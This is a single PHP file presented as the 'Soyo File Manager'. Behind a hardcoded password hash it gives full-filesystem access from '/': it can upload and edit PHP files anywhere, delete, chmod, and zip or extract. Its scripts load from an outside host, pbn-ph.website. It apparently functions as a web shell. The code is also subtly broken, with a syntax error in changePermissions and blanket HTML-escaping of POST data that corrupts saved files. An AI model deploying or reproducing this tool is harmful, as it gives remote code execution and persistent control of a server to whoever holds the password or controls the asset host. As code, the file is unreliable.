<?php
session_start([
    'cookie_httponly' => true,
    'cookie_secure' => true, // Enable if using HTTPS
    'use_strict_mode' => true
]);

// Sanitize inputs
$_GET = array_map('htmlspecialchars', $_GET);
$_POST = array_map('htmlspecialchars', $_POST);

// Constants
define('ASSETS_URL', 'https://pbn-ph.website/SoyoFileManager/');
define('MAX_UPLOAD_SIZE', 50 * 1024 * 1024);
define('ALLOWED_EXTENSIONS', ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'zip']);
define('PASSWORD_HASH', '$2y$10$Xx1c0aYemh5Xc4oV16j6SOJabT5Z3DBY.pm5CiORPGnk62Jof8NGq');

// CDN Configuration
$cdn_config = ['use_cdn' => true];

// Helper function to get asset URL
function getAssetUrl($path) {
    global $cdn_config;
    return $cdn_config['use_cdn'] ? ASSETS_URL . ltrim($path, '/') : $path;
}

// AUTH FUNCTIONS
function verifyPassword($password, $hash) {
    return password_verify($password, $hash);
}

// PATH MANAGER
class PathManager {
    private $uploadPath;
    private $rootPath;
    private $showHidden;

    public function __construct($uploadPath, $rootPath, $showHidden) {
        $this->uploadPath = realpath($uploadPath) ?: throw new Exception("Upload path does not exist: $uploadPath");
        $this->rootPath = realpath($rootPath) ?: throw new Exception("Root path does not exist: $rootPath");
        $this->showHidden = $showHidden;
    }

    public function resolveRequestedPath($requestedPath = null): string {
        if (empty($requestedPath)) return $this->uploadPath;
        $uploadParent = dirname($this->uploadPath);
        $path = strpos($requestedPath, '/') === 0
            ? realpath($requestedPath)
            : (realpath($uploadParent . '/' . $requestedPath) ?: realpath($this->uploadPath . '/' . $requestedPath));
        if (!$path || !$this->canAccessPath($path)) throw new Exception("Access denied or path not found: $requestedPath");
        return $path;
    }

    public function getRelativePath($absolutePath): string {
        if ($absolutePath === $this->uploadPath) return '';
        $uploadParent = dirname($this->uploadPath);
        if (dirname($absolutePath) === $uploadParent && $absolutePath !== $this->uploadPath) return basename($absolutePath);
        if (strpos($absolutePath, $this->uploadPath) === 0) return trim(substr($absolutePath, strlen($this->uploadPath)), '/\\');
        return $absolutePath;
    }

    public function canAccessPath($path): bool {
        $realPath = realpath($path);
        return $realPath && strpos($realPath, $this->rootPath) === 0;
    }

    public function generateBreadcrumb($currentPath): string {
        $breadcrumb = '<a href="?">🏠 Home (' . htmlspecialchars(basename($this->uploadPath)) . ')</a>';
        if ($currentPath === $this->uploadPath) return $breadcrumb . $this->getPathInfo($currentPath);
        $relative = str_replace($this->uploadPath, '', $currentPath);
        $pathParts = explode('/', trim($relative, '/'));
        $buildPath = '';
        foreach (array_filter($pathParts) as $part) {
            $buildPath .= '/' . $part;
            $encodedPath = urlencode(trim($buildPath, '/'));
            $breadcrumb .= ' / <a href="?path=' . $encodedPath . '">' . htmlspecialchars($part) . '</a>';
        }
        return $breadcrumb . $this->getPathInfo($currentPath);
    }

    private function getPathInfo($currentPath): string {
        return '<div style="margin-top:8px;font-size:11px;color:#a0a0b0;font-family:monospace">📍 Current: ' . htmlspecialchars($currentPath) . '<br>🏠 Upload Base: ' . htmlspecialchars($this->uploadPath) . '</div>';
    }
}

// Initialize path manager
$pathManager = new PathManager(__DIR__, '/', false);

// Wrapper functions
function getCurrentPath() {
    global $pathManager;
    try {
        return $pathManager->resolveRequestedPath($_GET['path'] ?? '');
    } catch (Exception $e) {
        showError("Path Error", $e->getMessage());
    }
}

function getRelativePath($fullPath) {
    global $pathManager;
    try {
        return $pathManager->getRelativePath($fullPath);
    } catch (Exception $e) {
        showError("Path Error", $e->getMessage());
    }
}

function canAccessPath($path) {
    global $pathManager;
    return $pathManager->canAccessPath($path);
}

function generateBreadcrumb($currentPath) {
    global $pathManager;
    return $pathManager->generateBreadcrumb($currentPath);
}

// ERROR HANDLING
function showError($title, $message): never {
    http_response_code(403);
    $requestUri = htmlspecialchars($_SERVER['REQUEST_URI'] ?? 'N/A');
    $requestedPath = htmlspecialchars($_GET['path'] ?? 'N/A');
    $uploadPath = __DIR__;
    $rootPath = '/';
    echo <<<HTML
<!DOCTYPE html><html><head><title>$title - Soyo File Manager</title><style>body{font-family:"Segoe UI",Tahoma,sans-serif;background:#1e1e2e;color:#e0e0e0;padding:40px}.error-container{max-width:800px;margin:0 auto;background:#2a2a3e;padding:20px;border-radius:12px;border:1px solid #dc2626}.error-title{color:#ef4444;font-size:24px;margin-bottom:15px;display:flex;gap:10px}.error-message{background:#1e1e2e;padding:15px;border-radius:8px;border-left:4px solid #ef4444;margin-bottom:15px;white-space:pre-line;font-family:monospace}.error-actions{display:flex;gap:10px}.error-actions a{background:#6366f1;color:white;padding:8px 16px;text-decoration:none;border-radius:6px}.error-actions a:hover{background:#4f46e5}.debug-info{background:#374151;padding:10px;border-radius:6px;margin-top:15px;font-size:12px;color:#9ca3af}</style></head><body><div class="error-container"><div class="error-title">🚨 $title</div><div class="error-message">$message</div><div class="error-actions"><a href="?">🏠 Home</a><a href="javascript:history.back()">← Back</a></div><div class="debug-info"><strong>Debug Info:</strong><br>Request URI: $requestUri<br>Requested Path: $requestedPath<br>Upload Path: $uploadPath<br>Root Path: $rootPath</div></div></body></html>
HTML;
    exit;
}

// UTILITY FUNCTIONS
function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function getFilePermissions($perms) {
    $info = match (true) {
        ($perms & 0xC000) == 0xC000 => 's',
        ($perms & 0xA000) == 0xA000 => 'l',
        ($perms & 0x8000) == 0x8000 => '-',
        ($perms & 0x6000) == 0x6000 => 'b',
        ($perms & 0x4000) == 0x4000 => 'd',
        ($perms & 0x2000) == 0x2000 => 'c',
        ($perms & 0x1000) == 0x1000 => 'p',
        default => 'u'
    };
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
    return $info;
}

function getFileIcon($file, $isDir) {
    if ($isDir) return '📁';
    $extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return match ($extension) {
        'txt' => '📄', 'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '🚀',
        'json' => '🗄️', 'xml' => '📜', 'md' => '✍️', 'jpg', 'jpeg', 'png', 'gif' => '🖼️',
        'pdf' => '📕', 'zip' => '📦', default => '🗎'
    };
}

function isEditable($file) {
    $editable = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md'];
    return in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), $editable);
}

function isViewable($file) {
    $viewable = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    return in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), $viewable);
}

function sortFiles(array $files, string $currentPath, string $sortBy, string $sortOrder): array {
    $fileData = [];
    foreach ($files as $file) {
        $path = $currentPath . DIRECTORY_SEPARATOR . $file;
        $fileData[$file] = [
            'isDir' => is_dir($path),
            'size' => is_dir($path) ? 0 : (filesize($path) ?: 0),
            'mtime' => filemtime($path) ?: 0
        ];
    }
    usort($files, fn($a, $b) => ($fileData[$a]['isDir'] && !$fileData[$b]['isDir']) ? -1 : 
        (!$fileData[$a]['isDir'] && $fileData[$b]['isDir']) ? 1 : 
        ($sortOrder === 'asc' ? 1 : -1) * match ($sortBy) {
            'size' => $fileData[$a]['size'] <=> $fileData[$b]['size'],
            'date' => $fileData[$a]['mtime'] <=> $fileData[$b]['mtime'],
            default => strnatcasecmp($a, $b)
        });
    return $files;
}

function getLanguageFromExtension($extension) {
    $languages = [
        'php' => 'php', 'html' => 'html', 'htm' => 'html', 'css' => 'css', 'js' => 'javascript',
        'json' => 'json', 'xml' => 'xml', 'sql' => 'sql', 'py' => 'python', 'java' => 'java',
        'cpp' => 'cpp', 'c' => 'c', 'cs' => 'csharp', 'rb' => 'ruby', 'go' => 'go',
        'rs' => 'rust', 'ts' => 'typescript', 'sh' => 'shell', 'bash' => 'shell', 'yml' => 'yaml',
        'yaml' => 'yaml', 'md' => 'markdown', 'txt' => 'plaintext', 'log' => 'plaintext',
        'ini' => 'ini', 'conf' => 'ini'
    ];
    return $languages[$extension] ?? 'plaintext';
}

function recurseCopy($src, $dst) {
    $dir = opendir($src);
    @mkdir($dst);
    while (($file = readdir($dir)) !== false) {
        if ($file !== '.' && $file !== '..') {
            $srcPath = $src . '/' . $file;
            $dstPath = $dst . '/' . $file;
            is_dir($srcPath) ? recurseCopy($srcPath, $dstPath) : copy($srcPath, $dstPath);
        }
    }
    closedir($dir);
    return true;
}

// FILE OPERATIONS
function viewFile($filePath) {
    if (!canAccessPath($filePath) || !file_exists($filePath)) {
        http_response_code(404);
        echo "File not found or access denied.";
        return;
    }
    header('Content-Type: ' . mime_content_type($filePath));
    readfile($filePath);
}

function downloadFile($filePath) {
    if (!canAccessPath($filePath) || !file_exists($filePath)) {
        http_response_code(404);
        echo "File not found or access denied.";
        return;
    }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filePath));
    readfile($filePath);
}

function deleteFile($filePath) {
    if (!canAccessPath($filePath) || !file_exists($filePath)) showError("Delete Error", "File not found or access denied: $filePath");
    if (unlink($filePath)) header('Location: ?path=' . urlencode(getRelativePath(dirname($filePath))));
    else showError("Delete Error", "Failed to delete file: $filePath");
}

function uploadFiles($targetDirectory) {
    if (!is_dir($targetDirectory) || !is_writable($targetDirectory) || !canAccessPath($targetDirectory)) {
        showError("Upload Error", "Target directory is invalid or not writable: $targetDirectory");
    }
    $errors = [];
    foreach ($_FILES['files']['name'] as $i => $name) {
        if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) {
            $errors[] = "Error during upload: $name";
            continue;
        }
        $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
        $size = $_FILES['files']['size'][$i];
        if (!in_array($ext, ALLOWED_EXTENSIONS)) {
            $errors[] = "Invalid file type: $name";
            continue;
        }
        if ($size > MAX_UPLOAD_SIZE) {
            $errors[] = "File size exceeds limit: $name";
            continue;
        }
        $destination = $targetDirectory . '/' . $name;
        if (!move_uploaded_file($_FILES['files']['tmp_name'][$i], $destination)) {
            $errors[] = "Error uploading file: $name";
        }
    }
    if ($errors) showError("Upload Errors", implode("\n", $errors));
    header('Location: ?path=' . urlencode(getRelativePath($targetDirectory)));
}

function createFolder($targetDirectory, $folderName) {
    if (empty($folderName)) showError("Create Folder Error", "Folder name cannot be empty");
    if (!canAccessPath($targetDirectory) || !is_writable($targetDirectory)) {
        showError("Create Folder Error", "Access denied or directory not writable: $targetDirectory");
    }
    $newPath = $targetDirectory . '/' . $folderName;
    if (mkdir($newPath)) header('Location: ?path=' . urlencode(getRelativePath($targetDirectory)));
    else showError("Create Folder Error", "Failed to create folder: $newPath");
}

function createFile($targetDirectory, $fileName, $content = '') {
    if (empty($fileName)) showError("Create File Error", "File name cannot be empty");
    if (!canAccessPath($targetDirectory) || !is_writable($targetDirectory)) {
        showError("Create File Error", "Access denied or directory not writable: $targetDirectory");
    }
    $newPath = $targetDirectory . '/' . $fileName;
    if (file_exists($newPath)) showError("Create File Error", "File already exists: $newPath");
    if (file_put_contents($newPath, $content) !== false) {
        header('Location: ?path=' . urlencode(getRelativePath($targetDirectory)));
    } else {
        showError("Create File Error", "Failed to create file: $newPath");
    }
}

function saveFile($filePath, $content) {
    if (!canAccessPath($filePath)) showError("Save File Error", "Access denied: $filePath");
    if (file_put_contents($filePath, $content) !== false) {
        header('Location: ?path=' . urlencode(getRelativePath(dirname($filePath))));
    } else {
        showError("Save File Error", "Failed to save file: $filePath");
    }
}

function changePermissions($filePath, $permissions) {
    if (!canAccessPath($filePath)) showError("Change Permissions Error", "Access denied: $filePath");
    $permissions = octdec($permissions);
    if (chmod($filePath, $permissions)) {
        header('Location: ?path=' . urlencode(getRelativePath(dirname($filePath)));
    } else {
        showError("Change Permissions Error", "Failed to change permissions for: $filePath");
    }
}

function compressFiles($targetDirectory, $files, $archiveName) {
    if (empty($files)) showError("Compress Error", "No files selected for compression");
    if (!canAccessPath($targetDirectory) || !is_writable($targetDirectory)) {
        showError("Compress Error", "Access denied or directory not writable: $targetDirectory");
    }
    $archiveName = $archiveName ?: 'archive';
    $zipFile = $targetDirectory . '/' . $archiveName . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE) === true) {
        foreach ($files as $file) {
            $path = $targetDirectory . '/' . $file;
            if (file_exists($path)) {
                is_dir($path) ? addDirectoryToZip($zip, $path, $file) : $zip->addFile($path, $file);
            }
        }
        $zip->close();
        header('Location: ?path=' . urlencode(getRelativePath($targetDirectory)));
    } else {
        showError("Compress Error", "Failed to create zip archive: $zipFile");
    }
}

function addDirectoryToZip($zip, $dirPath, $localPath) {
    $zip->addEmptyDir($localPath);
    $files = scandir($dirPath);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $filePath = $dirPath . '/' . $file;
            $localFilePath = $localPath . '/' . $file;
            is_dir($filePath) ? addDirectoryToZip($zip, $filePath, $localFilePath) : $zip->addFile($filePath, $localFilePath);
        }
    }
}

function extractFile($filePath) {
    if (!canAccessPath($filePath)) showError("Extract Error", "Access denied: $filePath");
    $zip = new ZipArchive();
    if ($zip->open($filePath) === true) {
        $zip->extractTo(dirname($filePath));
        $zip->close();
        header('Location: ?path=' . urlencode(getRelativePath(dirname($filePath))));
    } else {
        showError("Extract Error", "Failed to open zip archive: $filePath");
    }
}

function copyToClipboard($filePath) {
    if (!canAccessPath($filePath)) showError("Copy Error", "Access denied: $filePath");
    $_SESSION['clipboard'] = [
        'path' => $filePath,
        'type' => is_dir($filePath) ? 'directory' : 'file'
    ];
    header('Location: ?path=' . urlencode(getRelativePath(dirname($filePath))));
}

function pasteFromClipboard($targetDirectory) {
    if (!isset($_SESSION['clipboard'])) showError("Paste Error", "Clipboard is empty");
    if (!canAccessPath($targetDirectory) || !is_writable($targetDirectory)) {
        showError("Paste Error", "Access denied or directory not writable: $targetDirectory");
    }
    $source = $_SESSION['clipboard']['path'];
    $name = basename($source);
    $dest = $targetDirectory . '/' . $name;
    if (file_exists($dest)) showError("Paste Error", "File/directory already exists: $dest");
    $success = is_dir($source) ? recurseCopy($source, $dest) : copy($source, $dest);
    if ($success) header('Location: ?path=' . urlencode(getRelativePath($targetDirectory)));
    else showError("Paste Error", "Failed to paste from $source to $dest");
}

function bulkDeleteFiles($files, $currentPath) {
    if (empty($files)) showError("Bulk Delete Error", "No files selected");
    if (!canAccessPath($currentPath)) showError("Bulk Delete Error", "Access denied: $currentPath");
    $deleted = 0;
    $errors = [];
    foreach ($files as $file) {
        $path = $currentPath . '/' . $file;
        if (file_exists($path) && canAccessPath($path)) {
            $success = is_dir($path) ? deleteDirectory($path) : unlink($path);
            $success ? $deleted++ : $errors[] = "Failed to delete: $file";
        } else {
            $errors[] = "Not found or denied: $file";
        }
    }
    if ($errors) showError("Bulk Delete Errors", "Deleted $deleted items, errors:\n" . implode("\n", $errors));
    $_SESSION['message'] = "Deleted $deleted items.";
    header('Location: ?path=' . urlencode(getRelativePath($currentPath)));
}

function bulkCopyFiles($files, $currentPath) {
    if (empty($files)) showError("Bulk Copy Error", "No files selected");
    if (!canAccessPath($currentPath)) showError("Bulk Copy Error", "Access denied: $currentPath");
    $_SESSION['bulk_clipboard'] = [];
    foreach ($files as $file) {
        $path = $currentPath . '/' . $file;
        if (file_exists($path) && canAccessPath($path)) {
            $_SESSION['bulk_clipboard'][] = [
                'path' => $path,
                'type' => is_dir($path) ? 'directory' : 'file',
                'name' => $file
            ];
        }
    }
    $_SESSION['message'] = "Copied " . count($_SESSION['bulk_clipboard']) . " items.";
    header('Location: ?path=' . urlencode(getRelativePath($currentPath)));
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) return unlink($dir);
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        is_dir($path) ? deleteDirectory($path) : unlink($path);
    }
    return rmdir($dir);
}

// TEMPLATE FUNCTIONS
function showLoginForm() {
    ?>
    <!DOCTYPE html><html><head><title>File Manager - Login</title><link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/login.css'); ?>"></head><body><div class="login-form"><h2>🔐 Soyo File Manager</h2><form method="post"><input type="password" name="password" placeholder="Enter password" required><button type="submit">Login</button></form></div></body></html>
    <?php
}

function showFileManager($currentPath, $relativePath) {
    if (!canAccessPath($currentPath) || !is_readable($currentPath)) {
        showError("Access Denied", "Cannot access or read directory: $currentPath");
    }
    $files = array_filter(scandir($currentPath), fn($file) => $file !== '.' && (true || $file[0] !== '.'));
    $sortBy = $_GET['sort'] ?? 'name';
    $sortOrder = $_GET['order'] ?? 'asc';
    $files = sortFiles($files, $currentPath, $sortBy, $sortOrder);
    ?>
    <!DOCTYPE html><html><head><title>File Manager</title><link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/combined.min.css'); ?>"></head><body><div class="header"><h1>📁 Soyo File Manager</h1><a href="?logout=1">🚪 Logout</a></div><div class="breadcrumb"><?php echo generateBreadcrumb($currentPath); ?></div><div class="toolbar"><button onclick="toggleUpload()">📤 Upload</button><button onclick="toggleFolder()">📁 New Folder</button><button onclick="toggleCreateFile()">📄 New File</button><button onclick="toggleCompress()">📦 Compress</button></div><div id="upload-form" class="upload-form hidden"><form method="post" enctype="multipart/form-data" action="?action=upload&path=<?php echo urlencode($relativePath); ?>"><label>Select files:</label><input type="file" name="files[]" multiple required><input type="submit" value="Upload"><button type="button" onclick="toggleUpload()">Cancel</button></form></div><div id="folder-form" class="folder-form hidden"><form method="post" action="?action=create_folder&path=<?php echo urlencode($relativePath); ?>"><label>New folder:</label><input type="text" name="folder_name" placeholder="Folder name" required><input type="submit" value="Create"><button type="button" onclick="toggleFolder()">Cancel</button></form></div><div id="create-file-form" class="upload-form hidden"><form method="post" action="?action=create_file&path=<?php echo urlencode($relativePath); ?>"><label>New file:</label><input type="text" name="file_name" placeholder="filename.ext" required><br><label>Content (optional):</label><textarea name="file_content" placeholder="Content..." style="width:100%;height:200px"></textarea><br><input type="submit" value="Create"><button type="button" onclick="toggleCreateFile()">Cancel</button></form></div><div id="compress-form" class="compress-form hidden"><p>Compress Files:</p><p>Select files, then compress.</p><button onclick="bulkCompress()">📦 Compress Selected</button><button onclick="toggleCompress()">Cancel</button></div><?php if (isset($_SESSION['clipboard'])): ?><div id="paste-actions" class="bulk-actions" style="background:#10b981;display:block">📋 Clipboard: <?php echo htmlspecialchars(basename($_SESSION['clipboard']['path'])); ?> (<?php echo $_SESSION['clipboard']['type']; ?>)<button onclick="pasteItem()">📥 Paste</button><button onclick="clearClipboard()">🗑️ Clear</button></div><?php endif; ?><?php if (isset($_SESSION['bulk_clipboard'])): ?><div id="bulk-paste-actions" class="bulk-actions" style="background:#059669;display:block">📋 Bulk Clipboard: <?php echo count($_SESSION['bulk_clipboard']); ?> items<button onclick="bulkPaste()">📥 Paste All</button><button onclick="clearBulkClipboard()">🗑️ Clear</button></div><?php endif; ?><?php if (isset($_SESSION['message'])): ?><div class="bulk-actions" style="background:#10b981;display:block">✅ <?php echo htmlspecialchars($_SESSION['message']); ?></div><?php unset($_SESSION['message']); ?><?php endif; ?><div class="file-list"><div class="file-list-header"><div><input type="checkbox" id="select-all" onchange="selectAll()"></div><div>Type</div><div><a href="?path=<?php echo urlencode($relativePath); ?>&sort=name&order=<?php echo $sortBy === 'name' && $sortOrder === 'asc' ? 'desc' : 'asc'; ?>">Name<?php if ($sortBy === 'name') echo $sortOrder === 'asc' ? '↑' : '↓'; ?></a></div><div><a href="?path=<?php echo urlencode($relativePath); ?>&sort=size&order=<?php echo $sortBy === 'size' && $sortOrder === 'asc' ? 'desc' : 'asc'; ?>">Size<?php if ($sortBy === 'size') echo $sortOrder === 'asc' ? '↑' : '↓'; ?></a></div><div><a href="?path=<?php echo urlencode($relativePath); ?>&sort=date&order=<?php echo $sortBy === 'date' && $sortOrder === 'asc' ? 'desc' : 'asc'; ?>">Modified<?php if ($sortBy === 'date') echo $sortOrder === 'asc' ? '↑' : '↓'; ?></a></div><div>Permissions</div><div>Actions</div></div><?php $parentPath = dirname($currentPath); if ($parentPath !== $currentPath && $parentPath !== '.' && canAccessPath($parentPath)): $relativeParent = getRelativePath($parentPath); ?><div class="file-item folder"><div></div><div>📁</div><div><a href="?path=<?php echo urlencode($relativeParent); ?>">.. (Parent)</a></div><div>-</div><div>-</div><div>-</div><div></div></div><?php endif; ?><?php foreach ($files as $index => $file): $fullPath = $currentPath . DIRECTORY_SEPARATOR . $file; $isDir = is_dir($fullPath); $fileSize = $isDir ? '-' : formatBytes(filesize($fullPath) ?: 0); $fileDate = date('Y-m-d H:i:s', filemtime($fullPath) ?: 0); $filePerms = getFilePermissions(fileperms($fullPath) ?: 0); $fileIcon = getFileIcon($file, $isDir); $fileRelativePath = getRelativePath($fullPath); $isZip = !$isDir && strtolower(pathinfo($file, PATHINFO_EXTENSION)) === 'zip'; $isEditable = !$isDir && isEditable($file); $isViewable = !$isDir && isViewable($file); ?><div class="file-item <?php echo $isDir ? 'folder' : 'file'; ?>"><div><input type="checkbox" value="<?php echo htmlspecialchars($file); ?>" onchange="toggleBulkActions()"></div><div><?php echo $fileIcon; ?></div><div><?php if ($isDir): ?><a href="?path=<?php echo urlencode($fileRelativePath); ?>"><?php echo htmlspecialchars($file); ?></a><?php elseif ($isEditable): ?><a href="?action=edit&path=<?php echo urlencode($fileRelativePath); ?>"><?php echo htmlspecialchars($file); ?></a><?php elseif ($isViewable): ?><a href="?action=view&path=<?php echo urlencode($fileRelativePath); ?>" target="_blank"><?php echo htmlspecialchars($file); ?></a><?php else: ?><span><?php echo htmlspecialchars($file); ?></span><?php endif; ?></div><div><?php echo $fileSize; ?></div><div><?php echo $fileDate; ?></div><div><?php echo $filePerms; ?></div><div><div class="dropdown" id="dropdown-<?php echo $index; ?>"><button class="dropdown-btn" onclick="toggleDropdown(event, 'dropdown-<?php echo $index; ?>')">⋮</button><div class="dropdown-content"><?php if ($isZip): ?><a href="?action=extract&path=<?php echo urlencode($fileRelativePath); ?>" onclick="return confirm('Extract <?php echo htmlspecialchars($file); ?>?')">📦 Extract</a><?php endif; ?><?php if ($isEditable): ?><a href="?action=edit&path=<?php echo urlencode($fileRelativePath); ?>">✏️ Edit</a><?php endif; ?><?php if (!$isDir): ?><a href="?action=download&path=<?php echo urlencode($fileRelativePath); ?>">⬇️ Download</a><?php endif; ?><a href="?action=copy&path=<?php echo urlencode($fileRelativePath); ?>">📋 Copy</a><a href="?action=edit_permissions&path=<?php echo urlencode($fileRelativePath); ?>">🔒 Permissions</a><a href="?action=delete&path=<?php echo urlencode($fileRelativePath); ?>" onclick="return confirmDelete('<?php echo htmlspecialchars($file); ?>')">🗑️ Delete</a></div></div></div></div><?php endforeach; ?></div><div class="footer-info"><p>Directory: <?php echo htmlspecialchars($currentPath); ?></p><p>Items: <?php echo count($files); ?> | Sorted: <?php echo ucfirst($sortBy); ?> (<?php echo $sortOrder; ?>)</p></div><script src="<?php echo getAssetUrl('assets/js/main.min.js'); ?>"></script></body></html>
    <?php
}

function showEditor($filePath) {
    if (!canAccessPath($filePath)) showError("Editor Access Denied", "Access denied: $filePath");
    $content = file_get_contents($filePath);
    if ($content === false) showError("Editor Error", "Cannot read file: $filePath");
    $fileName = basename($filePath);
    $extension = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    $language = getLanguageFromExtension($extension);
    ?>
    <!DOCTYPE html><html><head><title>Edit: <?php echo htmlspecialchars($fileName); ?></title><script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.44.0/min/vs/loader.min.js"></script><link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/editor.css'); ?>"></head><body><div class="editor-header"><div><h2>📝 Editing: <?php echo htmlspecialchars($fileName); ?></h2><small>File path: <?php echo htmlspecialchars($filePath); ?></small></div><div class="editor-actions"><div class="editor-info">Language: <strong><?php echo ucfirst($language); ?></strong> | Size: <strong><?php echo formatBytes(strlen($content)); ?></strong></div><button type="button" class="save-btn" onclick="saveFile()">💾 Save</button><button type="button" class="cancel-btn" onclick="history.back()">❌ Cancel</button></div></div><div class="editor-container"><div id="loading" class="loading">🔄 Loading Monaco Editor...</div><div id="monaco-editor" style="display:none"></div></div><div class="editor-footer"><div class="editor-status"><span id="cursor-position">Line 1, Column 1</span><span id="selection-info"></span><span id="error-count">No errors</span></div><div class="editor-status"><span>Encoding: UTF-8</span><span>EOL: LF</span></div></div><form id="save-form" method="post" style="display:none"><input type="hidden" name="content" id="content-input"></form><script src="<?php echo getAssetUrl('assets/js/editor.js'); ?>"></script><script>document.addEventListener('DOMContentLoaded',function(){initializeEditor(<?php echo json_encode($content); ?>,'<?php echo $language; ?>')})</script></body></html>
    <?php
}

function showPermissionEditor($filePath) {
    if (!canAccessPath($filePath)) showError("Permission Editor Access Denied", "Access denied: $filePath");
    $currentPermissions = substr(sprintf('%o', fileperms($filePath)), -4);
    $fileName = basename($filePath);
    ?>
    <!DOCTYPE html><html><head><title>Edit Permissions: <?php echo htmlspecialchars($fileName); ?> - Soyo File Manager</title><link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/forms.css'); ?>"></head><body class="permissions-form"><h1>Edit Permissions: <?php echo htmlspecialchars($fileName); ?></h1><form method="post"><input type="text" name="permissions" value="<?php echo $currentPermissions; ?>" placeholder="e.g., 0777"><input type="submit" value="Change Permissions"></form></body></html>
    <?php
}

// MAIN EXECUTION
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password']) && verifyPassword($_POST['password'], PASSWORD_HASH)) {
        session_regenerate_id(true);
        $_SESSION['authenticated'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    showLoginForm();
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

$action = $_GET['action'] ?? '';
$currentPath = getCurrentPath();
$relativePath = getRelativePath($currentPath);
$filePath = $action && isset($_GET['path']) ? $pathManager->resolveRequestedPath($_GET['path']) : $currentPath;

match ($action) {
    'view' => viewFile($filePath),
    'download' => downloadFile($filePath),
    'delete' => deleteFile($filePath),
    'upload' => uploadFiles($currentPath),
    'create_folder' => createFolder($currentPath, $_POST['folder_name'] ?? ''),
    'edit' => $_POST ? saveFile($filePath, $_POST['content']) : showEditor($filePath),
    'edit_permissions' => $_POST ? changePermissions($filePath, $_POST['permissions']) : showPermissionEditor($filePath),
    'compress' => compressFiles($currentPath, $_POST['files'] ?? [], $_POST['archive_name'] ?? ''),
    'extract' => extractFile($filePath),
    'create_file' => createFile($currentPath, $_POST['file_name'] ?? '', $_POST['file_content'] ?? ''),
    'copy' => copyToClipboard($filePath),
    'paste' => pasteFromClipboard($currentPath),
    'bulk_delete' => bulkDeleteFiles($_POST['files'] ?? [], $currentPath),
    'bulk_copy' => bulkCopyFiles($_POST['files'] ?? [], $currentPath),
    'clear_clipboard' => (function() use ($relativePath) {
        unset($_SESSION['clipboard']);
        header('Location: ?path=' . urlencode($relativePath));
        exit;
    })(),
    default => showFileManager($currentPath, $relativePath),
};
?>